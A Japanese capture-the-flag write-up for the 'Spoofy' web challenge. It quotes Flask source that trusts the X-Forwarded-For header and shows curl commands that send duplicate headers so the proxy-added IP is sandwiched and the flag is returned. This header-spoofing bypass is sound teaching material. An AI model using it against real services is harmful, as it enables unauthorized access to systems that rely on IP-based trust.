# Spoofy:Web:160pts
Clam decided to switch from repl.it to an actual hosting service like Heroku. In typical clam fashion, [he left a backdoor in](https://actf-spoofy.herokuapp.com/). Unfortunately for him, he should've stayed with repl.it...  
[Source](app.py)  

# Solution
アクセスするが文字列が表示されるだけなようだ。  
```bash
$ curl https://actf-spoofy.herokuapp.com/
I don't trust you >:(
```
配布されたソースを見ると以下のようであった。  
```python
~~~
@app.route("/")
def main_page() -> Response:
    if "X-Forwarded-For" in request.headers:
        # https://stackoverflow.com/q/18264304/
        # Some people say first ip in list, some people say last
        # I don't know who to believe
        # So just believe both
        ips: List[str] = request.headers["X-Forwarded-For"].split(", ")
        if not ips:
            return text_response("How is it even possible to have 0 IPs???", 400)
        if ips[0] != ips[-1]:
            return text_response(
                "First and last IPs disagree so I'm just going to not serve this request.",
                400,
            )
        ip: str = ips[0]
        if ip != "1.3.3.7":
            return text_response("I don't trust you >:(", 401)
        return text_response("Hello 1337 haxx0r, here's the flag! " + FLAG)
    else:
        return text_response("Please run the server through a proxy.", 400)
~~~
```
配列で管理されたX-Forwarded-Forの先頭と末尾が一致しており、さらにそれが1.3.3.7である場合フラグが得られるようだ。  
試しにX-Forwarded-Forを設定する。  
```bash
$ curl https://actf-spoofy.herokuapp.com/ -H "X-Forwarded-For: 1.3.3.7"
First and last IPs disagree so I'm just going to not serve this request.
$ curl https://actf-spoofy.herokuapp.com/ -H "X-Forwarded-For: 1.3.3.7, 1.3.3.7"
First and last IPs disagree so I'm just going to not serve this request.
```
どうやらサーバを経由するごとにIPが末尾に付加されているようだ。  
これを回避することは難しいが、配列で管理されている部分で複数のX-Forwarded-Forが付加されている場合を考慮していない。  
```
X-Forwarded-For: 1.3.3.7
X-Forwarded-For: , 1.3.3.7
```
とした場合、xxx.xxx.xxx.xxxを経由したとしても以下のようになる。  
```
['1.3.3.7', 'xxx.xxx.xxx.xxx,', '1.3.3.7']
```
以下のように実際に行う。  
```bash
$ curl https://actf-spoofy.herokuapp.com/ -H "X-Forwarded-For: 1.3.3.7" -H "X-Forwarded-For: , 1.3.3.7"
Hello 1337 haxx0r, here's the flag! actf{spoofing_is_quite_spiffy}
```
flagが得られた。  

## actf{spoofing_is_quite_spiffy}